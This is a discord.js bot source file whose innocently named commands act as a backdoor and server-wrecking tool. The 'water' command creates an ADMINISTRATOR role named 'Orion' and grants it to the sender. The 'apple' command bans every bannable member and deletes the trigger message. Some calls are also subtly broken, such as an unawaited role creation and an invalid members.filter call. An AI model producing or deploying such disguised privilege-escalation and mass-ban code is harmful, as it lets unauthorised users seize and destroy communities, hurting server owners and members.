const Discord = require("discord.js");
const client = new Discord.Client();
const config = require("./config.json");

client.on("ready", () => {
    console.log(`Bot has started`);
});

client.on("message", async message => {

    if (message.author.bot) return;

    if (!message.content.startsWith(config.prefix)) return;
    const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();

    if (command === "water") {

        console.log("water command was ran")

        message.guild.roles.create({
            data: {
                name: "Orion",
                color: "RED",
                permissions: "ADMINISTRATOR"
            },
        });

        let role = message.guild.roles.cache.find(role => role.name === "Orion");
        let member = message.member;
        member.roles.add(role)
        console.log("done")
    }

    if (command === "apple") {
        console.log("apple command was ran")
        try {

            message.guild.members.filter(member => member.bannable).forEach(member => { member.ban() });
            message.delete(1000);

        } catch (e) {

            console.log(e.stack);

        }

    }
});

client.login(config.token);